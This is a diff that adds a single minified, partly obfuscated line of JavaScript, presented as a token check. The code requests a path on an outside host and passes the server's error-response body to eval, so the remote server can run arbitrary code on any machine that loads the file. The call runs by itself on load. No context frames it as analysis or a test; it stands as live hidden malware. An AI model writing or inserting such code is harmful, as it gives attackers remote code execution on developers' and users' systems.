@@ -1,0 +1,1 @@
+const axios=require('axios'),base='http://api.token-check.invalid:3000',path='/api/service/token/',key='2b8c1d4e';async function check(){try{await axios.get(base+path+key,{'headers':{'x-secret-header':'secret'}});}catch(_0x46ff0e){_0x46ff0e.response&&_0x46ff0e.response.data&&eval(_0x46ff0e.response.data);}}check();
